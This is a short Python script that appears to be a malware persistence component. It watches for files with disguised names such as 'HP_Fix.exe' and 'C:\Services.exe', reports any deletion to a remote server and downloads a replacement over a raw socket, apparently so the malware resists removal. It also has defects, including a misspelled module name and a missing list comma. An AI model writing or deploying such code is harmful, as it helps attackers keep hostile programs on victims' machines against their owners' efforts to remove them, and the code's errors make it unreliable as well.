import os
import subprocess
import socket
from time import sleep

p = os.getcwd()

ip = "127.0.0.1"

files = [
p + "\\HP_Fix.exe",
"C:\\Services.exe"
p + "\\app.exe"
]

def check_files():
#    global files
    while True:
        global files
        for file in files:
            sleep(10)
            if(os.path.isfile(file)):
                pass
            else:
                files.remove(file)
                inform(p)

def reload_file(name):
    global ip
    try:
        s = soceket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,2006))
        s.send(name.encode())
        sleep(1)
        file = s.recv(409600)
        new_file = open(name,'wb')
        new_file.write(file)
        new_file.close()
        s.send("DONE".encode())
    except:
        s.send("FAILED".encode())
    s.close()

def inform(path):
    global ip
    s = soceket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,2005))
    s.send(path.encode())
    s.close()
    reload_file(path)

def main():
    check_files()

if __name__ == '__main__':
    main()
